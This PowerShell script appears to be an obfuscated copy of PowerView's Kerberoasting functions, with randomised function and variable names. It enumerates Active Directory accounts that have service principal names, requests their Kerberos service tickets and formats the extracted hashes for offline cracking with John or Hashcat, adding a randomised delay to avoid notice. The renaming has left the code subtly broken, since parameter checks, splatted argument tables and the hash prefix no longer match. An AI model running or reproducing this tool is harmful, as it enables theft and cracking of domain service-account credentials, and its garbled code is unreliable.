function ingests {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $dIraKrTB99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gJYDdlck99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $JQmOoXvR99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $XhwMkNTb99,
        [ValidateNotNullOrEmpty()]
        [String]
        $nslvqWcs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $PlYjFMqs99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $gjpBhlXp99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $EwRcBzal99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $UudXehol99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $dYGHuUKh99,
        [Switch]
        $NcWVPEzT99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $FyiakyMi99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $HxdlcuwH99 = $dIraKrTB99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $YFqkVukk99 = Parisians -FyiakyMi99 $FyiakyMi99
            }
            else {
                $YFqkVukk99 = Parisians
            }
            $HxdlcuwH99 = $YFqkVukk99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($YFqkVukk99) {
                    $jopasBxo99 = $YFqkVukk99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $jopasBxo99 = ((Parisians -FyiakyMi99 $FyiakyMi99).PdcRoleOwner).Name
                }
                else {
                    $jopasBxo99 = ((Parisians).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[ingests] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $jopasBxo99 = $PlYjFMqs99
        }
        $BquDOKpZ99 = 'LDAP://'
        if ($jopasBxo99 -and ($jopasBxo99.Trim() -ne '')) {
            $BquDOKpZ99 += $jopasBxo99
            if ($HxdlcuwH99) {
                $BquDOKpZ99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $BquDOKpZ99 += $nslvqWcs99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($XhwMkNTb99 -Match '^GC://') {
                $DN = $XhwMkNTb99.ToUpper().Trim('/')
                $BquDOKpZ99 = ''
            }
            else {
                if ($XhwMkNTb99 -match '^LDAP://') {
                    if ($XhwMkNTb99 -match "LDAP://.+/.+") {
                        $BquDOKpZ99 = ''
                        $DN = $XhwMkNTb99
                    }
                    else {
                        $DN = $XhwMkNTb99.SubString(7)
                    }
                }
                else {
                    $DN = $XhwMkNTb99
                }
            }
        }
        else {
            if ($HxdlcuwH99 -and ($HxdlcuwH99.Trim() -ne '')) {
                $DN = "DC=$($HxdlcuwH99.Replace('.', ',DC='))"
            }
        }
        $BquDOKpZ99 += $DN
        Write-Verbose "[ingests] search string: $BquDOKpZ99"
        if ($FyiakyMi99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[ingests] Using alternate credentials for LDAP connection"
            $YFqkVukk99 = New-Object DirectoryServices.DirectoryEntry($BquDOKpZ99, $FyiakyMi99.UserName, $FyiakyMi99.GetNetworkCredential().Password)
            $fQHZVJGW99 = New-Object System.DirectoryServices.DirectorySearcher($YFqkVukk99)
        }
        else {
            $fQHZVJGW99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$BquDOKpZ99)
        }
        $fQHZVJGW99.PageSize = $EwRcBzal99
        $fQHZVJGW99.SearchScope = $gjpBhlXp99
        $fQHZVJGW99.CacheResults = $False
        $fQHZVJGW99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $fQHZVJGW99.ServerTimeLimit = $UudXehol99
        }
        if ($PSBoundParameters['Tombstone']) {
            $fQHZVJGW99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $fQHZVJGW99.filter = $gJYDdlck99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $fQHZVJGW99.SecurityMasks = Switch ($dYGHuUKh99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $QaOGFrhl99 = $JQmOoXvR99| ForEach-Object { $_.Split(',') }
            $Null = $fQHZVJGW99.PropertiesToLoad.AddRange(($QaOGFrhl99))
        }
        $fQHZVJGW99
    }
}
function knowledgeable {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $JQmOoXvR99
    )
    $oxrgZAja99 = @{}
    $JQmOoXvR99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $oxrgZAja99[$_] = $JQmOoXvR99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $oxrgZAja99[$_] = $JQmOoXvR99[$_][0] -as $xQYGlnhD99
            }
            elseif ($_ -eq 'samaccounttype') {
                $oxrgZAja99[$_] = $JQmOoXvR99[$_][0] -as $QshhRznV99
            }
            elseif ($_ -eq 'objectguid') {
                $oxrgZAja99[$_] = (New-Object Guid (,$JQmOoXvR99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $oxrgZAja99[$_] = $JQmOoXvR99[$_][0] -as $XJfXBlwV99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $nOUZaGGX99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $JQmOoXvR99[$_][0], 0
                if ($nOUZaGGX99.Owner) {
                    $oxrgZAja99['Owner'] = $nOUZaGGX99.Owner
                }
                if ($nOUZaGGX99.Group) {
                    $oxrgZAja99['Group'] = $nOUZaGGX99.Group
                }
                if ($nOUZaGGX99.DiscretionaryAcl) {
                    $oxrgZAja99['DiscretionaryAcl'] = $nOUZaGGX99.DiscretionaryAcl
                }
                if ($nOUZaGGX99.SystemAcl) {
                    $oxrgZAja99['SystemAcl'] = $nOUZaGGX99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($JQmOoXvR99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $oxrgZAja99[$_] = "NEVER"
                }
                else {
                    $oxrgZAja99[$_] = [datetime]::fromfiletime($JQmOoXvR99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($JQmOoXvR99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $JQmOoXvR99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $oxrgZAja99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $oxrgZAja99[$_] = ([datetime]::FromFileTime(($JQmOoXvR99[$_][0])))
                }
            }
            elseif ($JQmOoXvR99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $JQmOoXvR99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $oxrgZAja99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[knowledgeable] error: $_"
                    $oxrgZAja99[$_] = $Prop[$_]
                }
            }
            elseif ($JQmOoXvR99[$_].count -eq 1) {
                $oxrgZAja99[$_] = $JQmOoXvR99[$_][0]
            }
            else {
                $oxrgZAja99[$_] = $JQmOoXvR99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $oxrgZAja99
    }
    catch {
        Write-Warning "[knowledgeable] Error parsing LDAP properties : $_"
    }
}
function Parisians {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $dIraKrTB99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $FyiakyMi99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[Parisians] Using alternate credentials for Parisians'
            if ($PSBoundParameters['Domain']) {
                $HxdlcuwH99 = $dIraKrTB99
            }
            else {
                $HxdlcuwH99 = $FyiakyMi99.GetNetworkCredential().Domain
                Write-Verbose "[Parisians] Extracted domain '$HxdlcuwH99' from -FyiakyMi99"
            }
            $zfRAZVfJ99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $HxdlcuwH99, $FyiakyMi99.UserName, $FyiakyMi99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($zfRAZVfJ99)
            }
            catch {
                Write-Verbose "[Parisians] The specified domain '$HxdlcuwH99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $zfRAZVfJ99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $dIraKrTB99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($zfRAZVfJ99)
            }
            catch {
                Write-Verbose "[Parisians] The specified domain '$dIraKrTB99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Parisians] Error retrieving the current domain: $_"
            }
        }
    }
}
function confuting {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $UajBeUdE99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $YkhZNnwn99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $FyiakyMi99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $icIqpALZ99 = Invoke-UserImpersonation -FyiakyMi99 $FyiakyMi99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $jAZOLlvu99 = $User
        }
        else {
            $jAZOLlvu99 = $SPN
        }
	
	$oplSkPtT99 = New-Object System.Random
        ForEach ($Object in $jAZOLlvu99) {
            if ($PSBoundParameters['User']) {
                $viFAGDij99 = $Object.ServicePrincipalName
                $PCZyDvNp99 = $Object.SamAccountName
                $JSgqfwmw99 = $Object.DistinguishedName
            }
            else {
                $viFAGDij99 = $Object
                $PCZyDvNp99 = 'UNKNOWN'
                $JSgqfwmw99 = 'UNKNOWN'
            }
            if ($viFAGDij99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $viFAGDij99 = $viFAGDij99[0]
            }
            try {
                $qTmpRtLE99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $viFAGDij99
            }
            catch {
                Write-Warning "[confuting] Error requesting ticket for SPN '$viFAGDij99' from user '$JSgqfwmw99' : $_"
            }
            if ($qTmpRtLE99) {
                $OskwtXZa99 = $qTmpRtLE99.GetRequest()
            }
            if ($OskwtXZa99) {
                $Out = New-Object PSObject
                $AFGOHWXP99 = [System.BitConverter]::ToString($OskwtXZa99) -replace '-'
                if($AFGOHWXP99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $NyCMsMGg99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $UxeoZFaT99 = $Matches.DataToEnd.Substring(0,$NyCMsMGg99*2)
                    if($Matches.DataToEnd.Substring($NyCMsMGg99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($qTmpRtLE99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($OskwtXZa99).Replace('-',''))
                    } else {
                        $Hash = "$($UxeoZFaT99.Substring(0,32))`$$($UxeoZFaT99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($qTmpRtLE99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($OskwtXZa99).Replace('-',''))
                }
                if($Hash) {
                    if ($UajBeUdE99 -match 'John') {
                        $tYzzPexi99 = "`$wbzGzNFq99`$$($qTmpRtLE99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($JSgqfwmw99 -ne 'UNKNOWN') {
                            $XKEmorIk99 = $JSgqfwmw99.SubString($JSgqfwmw99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $XKEmorIk99 = 'UNKNOWN'
                        }
                        $tYzzPexi99 = "`$wbzGzNFq99`$$($Etype)`$*$PCZyDvNp99`$$XKEmorIk99`$$($qTmpRtLE99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $tYzzPexi99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $PCZyDvNp99
                $Out | Add-Member Noteproperty 'DistinguishedName' $JSgqfwmw99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $qTmpRtLE99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $oplSkPtT99.Next((1-$YkhZNnwn99)*$Delay, (1+$YkhZNnwn99)*$Delay)
        }
    }
    END {
        if ($icIqpALZ99) {
            Invoke-RevertToSelf -TokenHandle $icIqpALZ99
        }
    }
}
function normalcy {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $HBEJsBby99,
        [Switch]
        $SPN,
        [Switch]
        $sJBOgmKb99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $KolMlgzV99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $KaOWoxkJ99,
        [Switch]
        $oevkewru99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $iTIURTxx99,
        [ValidateNotNullOrEmpty()]
        [String]
        $dIraKrTB99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gJYDdlck99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $JQmOoXvR99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $XhwMkNTb99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $PlYjFMqs99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $gjpBhlXp99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $EwRcBzal99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $UudXehol99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $dYGHuUKh99,
        [Switch]
        $NcWVPEzT99,
        [Alias('ReturnOne')]
        [Switch]
        $mCsqbdXb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $FyiakyMi99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $kpVZVmBm99 = @{}
        if ($PSBoundParameters['Domain']) { $kpVZVmBm99['Domain'] = $dIraKrTB99 }
        if ($PSBoundParameters['Properties']) { $kpVZVmBm99['Properties'] = $JQmOoXvR99 }
        if ($PSBoundParameters['SearchBase']) { $kpVZVmBm99['SearchBase'] = $XhwMkNTb99 }
        if ($PSBoundParameters['Server']) { $kpVZVmBm99['Server'] = $PlYjFMqs99 }
        if ($PSBoundParameters['SearchScope']) { $kpVZVmBm99['SearchScope'] = $gjpBhlXp99 }
        if ($PSBoundParameters['ResultPageSize']) { $kpVZVmBm99['ResultPageSize'] = $EwRcBzal99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $kpVZVmBm99['ServerTimeLimit'] = $UudXehol99 }
        if ($PSBoundParameters['SecurityMasks']) { $kpVZVmBm99['SecurityMasks'] = $dYGHuUKh99 }
        if ($PSBoundParameters['Tombstone']) { $kpVZVmBm99['Tombstone'] = $NcWVPEzT99 }
        if ($PSBoundParameters['Credential']) { $kpVZVmBm99['Credential'] = $FyiakyMi99 }
        $wCdGCOUc99 = ingests @SearcherArguments
    }
    PROCESS {
        if ($wCdGCOUc99) {
            $SnjxizYU99 = ''
            $uTNvmPAi99 = ''
            $HBEJsBby99 | Where-Object {$_} | ForEach-Object {
                $eFcKLhGs99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($eFcKLhGs99 -match '^S-1-') {
                    $SnjxizYU99 += "(objectsid=$eFcKLhGs99)"
                }
                elseif ($eFcKLhGs99 -match '^CN=') {
                    $SnjxizYU99 += "(distinguishedname=$eFcKLhGs99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $gxSUOZFN99 = $eFcKLhGs99.SubString($eFcKLhGs99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[normalcy] Extracted domain '$gxSUOZFN99' from '$eFcKLhGs99'"
                        $kpVZVmBm99['Domain'] = $gxSUOZFN99
                        $wCdGCOUc99 = ingests @SearcherArguments
                        if (-not $wCdGCOUc99) {
                            Write-Warning "[normalcy] Unable to retrieve domain searcher for '$gxSUOZFN99'"
                        }
                    }
                }
                elseif ($eFcKLhGs99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ZglyyCbw99 = (([Guid]$eFcKLhGs99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $SnjxizYU99 += "(objectguid=$ZglyyCbw99)"
                }
                elseif ($eFcKLhGs99.Contains('\')) {
                    $yayhWBJj99 = $eFcKLhGs99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($yayhWBJj99) {
                        $XKEmorIk99 = $yayhWBJj99.SubString(0, $yayhWBJj99.IndexOf('/'))
                        $LuRafsFp99 = $eFcKLhGs99.Split('\')[1]
                        $SnjxizYU99 += "(samAccountName=$LuRafsFp99)"
                        $kpVZVmBm99['Domain'] = $XKEmorIk99
                        Write-Verbose "[normalcy] Extracted domain '$XKEmorIk99' from '$eFcKLhGs99'"
                        $wCdGCOUc99 = ingests @SearcherArguments
                    }
                }
                else {
                    $SnjxizYU99 += "(samAccountName=$eFcKLhGs99)"
                }
            }
            if ($SnjxizYU99 -and ($SnjxizYU99.Trim() -ne '') ) {
                $uTNvmPAi99 += "(|$SnjxizYU99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[normalcy] Searching for non-null service principal names'
                $uTNvmPAi99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[normalcy] Searching for users who can be delegated'
                $uTNvmPAi99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[normalcy] Searching for users who are sensitive and not trusted for delegation'
                $uTNvmPAi99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[normalcy] Searching for adminCount=1'
                $uTNvmPAi99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[normalcy] Searching for users that are trusted to authenticate for other principals'
                $uTNvmPAi99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[normalcy] Searching for user accounts that do not require kerberos preauthenticate'
                $uTNvmPAi99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[normalcy] Using additional LDAP filter: $gJYDdlck99"
                $uTNvmPAi99 += "$gJYDdlck99"
            }
            $qXWUxtMK99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $oWYpUcyy99 = $_.Substring(4)
                    $OQOSeWlL99 = [Int]($XJfXBlwV99::$oWYpUcyy99)
                    $uTNvmPAi99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$OQOSeWlL99))"
                }
                else {
                    $OQOSeWlL99 = [Int]($XJfXBlwV99::$_)
                    $uTNvmPAi99 += "(userAccountControl:1.2.840.113556.1.4.803:=$OQOSeWlL99)"
                }
            }
            $wCdGCOUc99.filter = "(&(samAccountType=805306368)$uTNvmPAi99)"
            Write-Verbose "[normalcy] filter string: $($wCdGCOUc99.filter)"
            if ($PSBoundParameters['FindOne']) { $SKnFlKHW99 = $wCdGCOUc99.FindOne() }
            else { $SKnFlKHW99 = $wCdGCOUc99.FindAll() }
            $SKnFlKHW99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = knowledgeable -JQmOoXvR99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($SKnFlKHW99) {
                try { $SKnFlKHW99.dispose() }
                catch {
                    Write-Verbose "[normalcy] Error disposing of the Results object: $_"
                }
            }
            $wCdGCOUc99.dispose()
        }
    }
}
function Spartacus {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $HBEJsBby99,
        [ValidateNotNullOrEmpty()]
        [String]
        $dIraKrTB99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gJYDdlck99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $XhwMkNTb99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $PlYjFMqs99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $gjpBhlXp99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $EwRcBzal99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $UudXehol99,
        [Switch]
        $NcWVPEzT99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $YkhZNnwn99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $UajBeUdE99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $FyiakyMi99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $gJHLezYt99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $gJHLezYt99['Domain'] = $dIraKrTB99 }
        if ($PSBoundParameters['LDAPFilter']) { $gJHLezYt99['LDAPFilter'] = $gJYDdlck99 }
        if ($PSBoundParameters['SearchBase']) { $gJHLezYt99['SearchBase'] = $XhwMkNTb99 }
        if ($PSBoundParameters['Server']) { $gJHLezYt99['Server'] = $PlYjFMqs99 }
        if ($PSBoundParameters['SearchScope']) { $gJHLezYt99['SearchScope'] = $gjpBhlXp99 }
        if ($PSBoundParameters['ResultPageSize']) { $gJHLezYt99['ResultPageSize'] = $EwRcBzal99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $gJHLezYt99['ServerTimeLimit'] = $UudXehol99 }
        if ($PSBoundParameters['Tombstone']) { $gJHLezYt99['Tombstone'] = $NcWVPEzT99 }
        if ($PSBoundParameters['Credential']) { $gJHLezYt99['Credential'] = $FyiakyMi99 }
        if ($PSBoundParameters['Credential']) {
            $icIqpALZ99 = Invoke-UserImpersonation -FyiakyMi99 $FyiakyMi99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $gJHLezYt99['Identity'] = $HBEJsBby99 }
        normalcy @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | confuting -Delay $Delay -UajBeUdE99 $UajBeUdE99 -YkhZNnwn99 $YkhZNnwn99
    }
    END {
        if ($icIqpALZ99) {
            Invoke-RevertToSelf -TokenHandle $icIqpALZ99
        }
    }
}
